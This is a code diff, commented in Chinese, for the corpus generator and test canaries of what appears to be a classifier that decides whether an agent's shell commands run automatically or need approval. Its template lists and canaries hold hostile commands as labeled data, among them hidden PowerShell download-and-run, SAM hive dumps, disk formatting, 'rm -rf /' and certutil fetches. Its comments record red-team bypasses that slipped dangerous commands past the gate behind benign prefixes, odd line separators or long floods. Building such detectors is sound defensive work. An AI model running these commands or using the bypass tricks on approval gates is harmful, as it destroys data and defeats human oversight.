@@ -161,6 +161,14 @@ const SAFE_TEMPLATES = [
     (r) => pick(r, ['Get-Process | Select-Object -First 5', 'Get-ChildItem -Recurse -Depth 1 ' + pick(r, DIRS)]),
     // 裸命令（无参数单 token）：特征极少的常见良性形态，配 bare 桶压制 bias 基线误拦
     (r) => pick(r, ['pwd', 'ls', 'cd', 'whoami', 'hostname', 'date', 'cls', 'clear', 'dir', 'tree', 'df', 'id', 'w', 'free', 'uptime', 'groups', 'node', 'python', 'git', 'npm']),
+    // 中文意图（红队 V-08：930 条语料里中文样本 0%，纯中文破坏命令 0.0893 三档放行）。
+    // 只学「意图词」不学「中文」：同位置必须配同样多的中文良性命中，否则中文文件名/输出会被误伤。
+    (r) => pick(r, ['查看当前目录', '列出所有文件', '显示文件内容', '查看系统版本', '打印环境变量', '显示磁盘剩余空间']) + pick(r, ['', '。', '，谢谢']),
+    (r) => pick(r, ['看看', '查一下', '帮我列出', '显示一下']) + pick(r, ['当前目录', '所有文件', '这个文件的内容', '最近的提交记录']),
+    (r) => pick(r, ['列出', '查看', '统计']) + pick(r, ['文件夹大小', '目录结构', '代码行数', '依赖版本']),
+    // 「所有文件」与破坏类是同一个宾语，只能靠动词 gram 分开：这里把动词/宾语组合铺够
+    (r) => pick(r, ['列出', '显示', '查看']) + pick(r, ['所有文件', '全部文件', '所有子目录']) + pick(r, ['', '的列表', '的名称']),
+    (r) => pick(r, ['看一下', '检查一下']) + pick(r, ['git 状态', '最近的五条提交', '端口占用', '磁盘空间']),
 ];
 
 // ---------- 危险类（label 1）：破坏性 / 系统修改 / 不可回滚 / 代码执行 ----------
@@ -228,6 +236,17 @@ const DANGEROUS_TEMPLATES = [
     (r) => pick(r, ['New-Service -Name ' + pick(r, SVCS) + ' -BinaryPathName ' + q(r, 'C:/Temp/x.exe'), 'sc create ' + pick(r, SVCS) + ' binpath= ' + q(r, 'C:/Temp/x.exe'), 'reg save HKLM\\SAM ' + q(r, 'sam.hiv')]),
     (r) => 'powershell ' + pick(r, ['-w hidden -nop -c iex(iwr ' + pick(r, URLS) + ')', '-Ex Bypass -NoP -w hidden -ec ' + pick(r, B64SAMPLES), '-nop -c "Start-Process cmd \'/c del /f /s /q C:/\'"']),
     (r) => 'Start-Process ' + pick(r, ['powershell -Verb RunAs -ArgumentList ' + q(r, '-c iex(iwr ' + pick(r, URLS) + ')'), q(r, 'C:/Temp/payload.exe')]),
+    // 中文破坏意图（同 SAFE 侧成对出现，学的是动词不是语种）。
+    // 宾语刻意与 SAFE 侧错开：`所有文件` 只留给「列出/显示」等良性意图，
+    // 危险侧改用「整个目录 / 全部备份 / 这些文件」，否则 3-gram 里 `所有文件`
+    // 两边计数相等，模型只能学到 0.5 概率的净零权重（实测压到 0.136 漏放）。
+    (r) => pick(r, ['删除', '清空', '格式化']) + pick(r, ['整个目录', '整个项目目录', '全部备份文件', '整个文件夹']),
+    (r) => pick(r, ['把 C 盘', '把 D 盘', '把整个项目']) + pick(r, ['格式化了', '全部删除', '清空掉', '删光']),
+    (r) => pick(r, ['清空', '删除', '格式化', '彻底删除']) + pick(r, ['整个目录', '整个项目目录', '全部备份文件', '整个数据盘']),
+    (r) => pick(r, ['永久删除', '强行删除', '一次性删掉']) + pick(r, ['这些文件', '整个文件夹', '所有本地数据']),
+    // 短句族：只训「动词 + 宾语」两词，让 删除/清空/格式化 的 3-gram 权重站稳。
+    // 长句（如「删除所有文件并且清空磁盘」）里动词 gram 会被宾语稀释，短句是对照组。
+    (r) => pick(r, ['删除所有文件', '删除全部文件', '清空磁盘', '清空整个磁盘', '格式化硬盘', '格掉整个分区']),
 ];
 
 // ---------- 灰色类（label 1，良性但必须 ask）：install / push / kill / 改环境 / 构建 ----------
@@ -243,8 +262,15 @@ const GRAY_TEMPLATES = [
     (r) => 'git commit ' + pick(r, ['-m ' + q(r, pick(r, ['fix', 'update docs', 'wip', 'refactor', 'add feature'])), '-am ' + q(r, 'update'), '--allow-empty -m x']),
     (r) => pick(r, ['kill ' + num(r, 1, 9999), 'taskkill /pid ' + num(r, 100, 9999), 'taskkill /im ' + pick(r, SVCS) + '.exe']),
     (r) => pick(r, ['docker rm ' + pick(r, SVCS), 'docker rmi ' + pick(r, PKGS), 'docker stop ' + pick(r, SVCS), 'docker restart ' + pick(r, SVCS), 'docker system prune -f']),
+    // prune 族单列：`docker ps` 等只读族样本多，单条 prune 被同前缀 gram 稀释到 0.09
+    (r) => 'docker ' + pick(r, ['system prune -a -f', 'system prune -af', 'volume prune -f', 'image prune -a -f', 'container prune -f']),
     (r) => pick(r, ['systemctl restart ' + pick(r, SVCS), 'systemctl stop ' + pick(r, SVCS), 'service ' + pick(r, SVCS) + ' restart']),
     (r) => pick(r, ['setx ' + pick(r, ['PATH', 'JAVA_HOME', 'NODE_OPTIONS']) + ' ' + q(r, 'C:/tools/bin'), 'export PATH=' + pick(r, DIRS) + ':$PATH', 'set NODE_ENV=production', 'export ' + pick(r, ['DEBUG', 'TOKEN', 'MODE']) + '=' + pick(r, ['1', 'true', 'dev'])]),
+    // 环境变量写入族单独多铺：裸 `set`（打印环境，安全）与 `set X=Y`（写环境，灰色）共享
+    // 首词，样本太少时模型只学到「set 安全」，`set NODE_ENV=production` 掉到 0.056 直接漏放。
+    (r) => 'set ' + pick(r, ['NODE_ENV', 'JAVA_HOME', 'PYTHONPATH', 'TZ', 'DEBUG', 'MODE']) + '=' + pick(r, ['production', 'C:/tools', 'UTC', 'dev', '1']),
+    (r) => 'export ' + pick(r, ['NODE_ENV', 'PYTHONPATH', 'TZ', 'MODE']) + '=' + pick(r, ['production', 'C:/tools/bin', 'UTC', 'dev']),
+    (r) => 'setx ' + pick(r, ['NODE_ENV', 'DEBUG', 'MODE']) + ' ' + q(r, pick(r, ['production', '1', 'true', 'C:/tools'])),
     (r) => 'export PATH=' + pick(r, DIRS) + ':$PATH',
     (r) => 'setx PATH ' + q(r, 'C:/tools/' + pick(r, DIRS)) + ' /m',
     (r) => 'git branch ' + pick(r, ['-D ' + pick(r, BRANCHES), '-d ' + pick(r, BRANCHES), '--delete ' + pick(r, BRANCHES)]),
@@ -252,6 +278,9 @@ const GRAY_TEMPLATES = [
     (r) => 'Remove-Item ' + q(r, pick(r, VICTIM_FILES)),
     (r) => pick(r, ['mkdir ' + pick(r, DIRS), 'mkdir -p ' + pick(r, DIRS) + '/' + pick(r, DIRS), 'New-Item -ItemType Directory -Path ' + q(r, pick(r, DIRS))]),
     (r) => pick(r, ['npm run ' + pick(r, ['build', 'test', 'lint', 'deploy', 'release']), 'npm test', 'yarn build', 'pnpm build']),
+    // 脚本执行族补量：`npm test` 曾卡在 0.143（阈值 0.15 差 0.007），因为 npm 前缀被
+    // 只读模板（npm ls / npm -v / npm config）占满，灰类只有 7 条样本拉不动
+    (r) => pick(r, ['npm run test', 'npm run lint', 'npm run format', 'npm run dev', 'npm run start', 'yarn test', 'pnpm test', 'yarn lint']),
     (r) => pick(r, ['cargo build', 'cargo build --release', 'go build ./...', 'dotnet build', 'mvn package', 'gradle build']),
     (r) => 'git ' + pick(r, ['merge ' + pick(r, BRANCHES), 'rebase ' + pick(r, BRANCHES), 'rebase -i HEAD~2', 'cherry-pick HEAD~1', 'revert HEAD']),
     (r) => 'chmod +x ' + q(r, pick(r, ['run.sh', 'setup.sh', pick(r, FILES)])),
@@ -266,6 +295,40 @@ const GRAY_TEMPLATES = [
     (r) => 'netsh interface ip set dns name="' + pick(r, ['Ethernet', 'Wi-Fi']) + '" static ' + pick(r, ['192.168.1.1', '8.8.8.8']),
     (r) => pick(r, ['attrib -r ' + q(r, pick(r, FILES)), 'icacls ' + q(r, pick(r, DIRS)) + ' /grant Everyone:F']),
     (r) => pick(r, ['attrib -r ' + q(r, pick(r, FILES)), 'attrib -r ' + pick(r, FILES)]),
+    // ACL 授权族单列：`icacls … /grant Everyone:F` 语义极强，但此前只和 attrib 共享一个模板槽，
+    // 130 条灰类里只有 2 条，重训后掉到 0.015 直接自动放行（把目录权限开给所有人）。
+    (r) => 'icacls ' + q(r, pick(r, [...DIRS, ...FILES])) + ' ' + pick(r, ['/grant Everyone:F', '/grant Users:(F)', '/grant Everyone:(OI)(CI)F', '/inheritance:r /grant Everyone:F']),
+    (r) => pick(r, ['takeown /f ' + q(r, pick(r, DIRS)) + ' /r', 'cacls ' + q(r, pick(r, DIRS)) + ' /e /t /g Everyone:F']),
+    // 侦察族（红队对抗层实测：reg query SAM 0.011 / vssadmin list shadows 0.102 /
+    // git config --global include.path 0.115 全部自动放行）。与安全类共享首词，
+    // 只能靠 hive、子命令、--global 这些局部 gram 分开，样本必须给够。
+    (r) => 'reg query ' + pick(r, ['HKLM\\SAM', 'HKLM\\SECURITY', 'HKLM\\SAM\\SAM', 'HKLM\\SECURITY\\Policy\\Secrets', 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa']) + pick(r, ['', ' /s', ' /v']),
+    (r) => 'vssadmin ' + pick(r, ['list shadows', 'list shadowstorage', 'list providers', 'list writers', 'list volumes']),
+    (r) => 'git config --global ' + pick(r, ['include.path ' + pick(r, ['/tmp/evil.conf', 'C:/Temp/x.conf']), 'core.hooksPath ' + pick(r, DIRS), 'core.pager "cat /etc/passwd"', 'credential.helper store']),
+    (r) => pick(r, ['getcap -r /', 'find / -perm -4000 -type f', 'whoami /priv', 'net localgroup administrators', 'net user']),
+];
+
+// ---------- 形态合成：良性前缀 / 分隔符族 / 长洪泛（红队 V-01，2026-11-18 语料审计 C-1）----------
+// 审计实测：装饰此前只存在于 safe 类（cd 16% / | tee 12.8% / FOO= 9.8%），危险类 cd/FOO=/tee 全 0%。
+// 模型能学到的唯一规律就是「带前缀 = 安全」，于是 `git log …\r…\rformat C:` 被压到 0.0165。
+// 这里给危险类补「良性前缀 + 危险尾部」，覆盖 && / ; / CR / LS / NEL 五种分隔符。
+// 关键：训练必须按**段**打标签（前缀 y=0、危险段 y=1）。整条打 y=1 会把前缀里的安全
+// n-gram 一起推向危险侧，等于换个方向继续错。
+// 前缀只能取「真安全」命令：这里严禁灰色类（npm run build / yarn build 等）。
+// 曾把 npm run build 当良性前缀，等于给同一条命令打了 y=0 和 y=1 两个标签，
+// 重训后 `yarn build` 掉到 0.108 直接漏放——被灰类闸门当场拿下。
+const BENIGN_PREFIXES = [
+    'git status', 'ls -la src', 'cat README.md', 'git log --oneline -n 5', 'git diff --stat',
+    'grep -rn error src', 'node --version', 'wc -l README.md', 'tree docs', 'git branch',
+];
+const DANGER_SEPARATORS = [' && ', ' ; ', '\r', '\u2028', '\u0085'];
+const FLOOD_FILLERS = ['git status', 'ls -la', 'cat README.md', 'git diff --stat', 'grep -rn error src', 'git branch -a'];
+// 裸命令（单 token）密度：`bare` 桶是压制 bias 基线误拦的专用维度，语料里长样本一多，
+// 该桶的负权重被稀释，pwd/ls 会从 0.04 漂到 0.34（对抗层实测）。
+const BARE_COMMANDS = [
+    'pwd', 'ls', 'dir', 'whoami', 'hostname', 'date', 'git', 'node', 'npm', 'tree', 'df', 'id',
+    'free', 'clear', 'ps', 'uname', 'ver', 'arch', 'groups', 'nproc', 'tty', 'env', 'printenv',
+    'uptime', 'w', 'du', 'yarn', 'pnpm', 'python', 'pip', 'go', 'cargo', 'dotnet', 'docker', 'kubectl',
 ];
 
 // ---------- 金丝雀（出厂权重验收集）----------
@@ -314,6 +377,56 @@ export const CANARIES = {
     ],
 };
 
+// plain 层是记忆层：其中 10/34 与训练语料逐字重复（审计实测），只能防「权重跑飞」，
+// 证明不了泛化。下面两层才是泛化闸门，条目一律不进训练集。
+
+const FORTY_EIGHT_BENIGN = Array(48).fill('echo hi').join('; ');
+
+// 对抗层：换分隔符、换长度、换上下文，考模型是不是真学到了「危险动词」而不是「格式」。
+export const ADVERSARIAL_CANARIES = {
+    dangerous: [
+        'git log --oneline -n 5\rgit diff --stat\rformat C: /y',
+        'ls -la\u2028format C: /y',
+        'git status\u0085shutdown /s /t 0',
+        FORTY_EIGHT_BENIGN + '; rm -rf /',
+        'git status && git diff --stat && del /f /s /q data.csv',
+    ],
+    gray: [
+        // 侦察 / 持久化 / 落地执行：不一定要高置信，但绝不能自动放行
+        'reg query HKLM\\SAM',
+        'vssadmin list shadows',
+        'git config --global include.path /tmp/evil.conf',
+        'cat /tmp/x.sh | sh',
+        'echo aGVsbG8= | /bin/sh',
+        '删除所有文件并且清空磁盘',
+        '格式化 C 盘',
+    ],
+    safe: [
+        'git status\rgit diff --stat',
+        'ls -la\u2028git status',
+        'git log --oneline -n 5\rcat README.md',
+        '查看当前目录',
+        '列出所有文件',
+    ],
+};
+
+// 回归层：本次（2026-11-18）修掉的每一条绕过，一条一个用例，防止再退化。
+export const REGRESSION_CANARIES = {
+    dangerous: [
+        'git log --oneline -n 5\rgit diff --stat\rformat C: /y', // V-01 换行族分隔
+        'git log --oneline -n 5\u2028shutdown /s /t 0', // LS 分隔
+        'git status\u0085Remove-Item -Recurse -Force C:\\data', // NEL 分隔
+        FORTY_EIGHT_BENIGN + '; format C:', // V-10 段数上限
+        'echo hi > /dev/null && format C: /y', // F-9 分段失败兜底
+    ],
+    gray: [
+        'echo hi > /dev/null && rm -r -f /tmp/x', // 分开写短标志
+        'echo hi > /dev/null && bcdedit /set {default} safeboot minimal',
+        'git log --oneline -n 5\rcertutil -urlcache -f http://x/p.sh p.sh',
+    ],
+    safe: [],
+};
+
 // 生成一份语料：按类轮转模板 + 随机扰动，去重后返回 {samples, stats}。
 export function generateCorpus(seed, counts) {
     const want = Object.assign({safe: 250, dangerous: 250, gray: 80}, counts || {});
@@ -336,7 +449,35 @@ export function generateCorpus(seed, counts) {
             let command = String(template(r) || '').replace(/\s+/g, ' ').trim();
             if (!command) continue;
             command = casing(r, command);
-            if (cls === 'safe' && chance(r, 0.15)) command = 'cd ' + pick(r, DIRS) + ' && ' + command;
+            // 危险类形态合成：良性前缀链（20%）/ 长洪泛（4%）。带 segments 时训练按段打标签。
+            let segments = null;
+            if (cls === 'dangerous') {
+                const roll = r();
+                if (roll < 0.2) {
+                    const prefix = [pick(r, BENIGN_PREFIXES)];
+                    if (chance(r, 0.45)) prefix.push(pick(r, BENIGN_PREFIXES));
+                    const sep = pick(r, DANGER_SEPARATORS);
+                    segments = prefix.map((text) => ({text, y: 0}));
+                    segments.push({text: command, y: 1});
+                    command = prefix.join(sep) + sep + command;
+                } else if (roll < 0.24) {
+                    const target = pick(r, [200, 800, 1900]);
+                    const filler = [];
+                    let len = 0;
+                    while (len < target) {
+                        const f = pick(r, FLOOD_FILLERS);
+                        filler.push(f);
+                        len += f.length + 4;
+                    }
+                    const sep = pick(r, [' && ', '; ', '\r']);
+                    segments = filler.map((text) => ({text, y: 0}));
+                    segments.push({text: command, y: 1});
+                    command = filler.join(sep) + sep + command;
+                }
+            }
+            if (cls === 'safe' && chance(r, 0.08)) command = 'cd ' + pick(r, DIRS) + ' && ' + command;
+            // 裸命令密度补偿（见 BARE_COMMANDS 注释）：只加在 safe 类，保证 `bare` 桶仍以负权为主
+            if (cls === 'safe' && chance(r, 0.1)) command = pick(r, BARE_COMMANDS);
             if (cls === 'safe' && chance(r, 0.1)) command = command + ' | tee ' + q(r, pick(r, SAFE_FILES));
             if (cls === 'safe' && chance(r, 0.08)) command = 'FOO=bar ' + command;
             // 常见良性惯用法：错误丢弃重定向（eval 发现 ls 2>/dev/null 被裸设备词面拉高）
@@ -344,7 +485,9 @@ export function generateCorpus(seed, counts) {
             if (chance(r, 0.06)) command = command.replace(' ', '  '); // 多空格噪声
             if (seen.has(command)) continue;
             seen.add(command);
-            samples.push({command, label, cls});
+            // segments：合成样本的按段标签（前缀 y=0 / 危险段 y=1），训练脚本据此按段展开
+            if (segments) samples.push({command, label, cls, segments});
+            else samples.push({command, label, cls});
             made += 1;
         }
         return made;
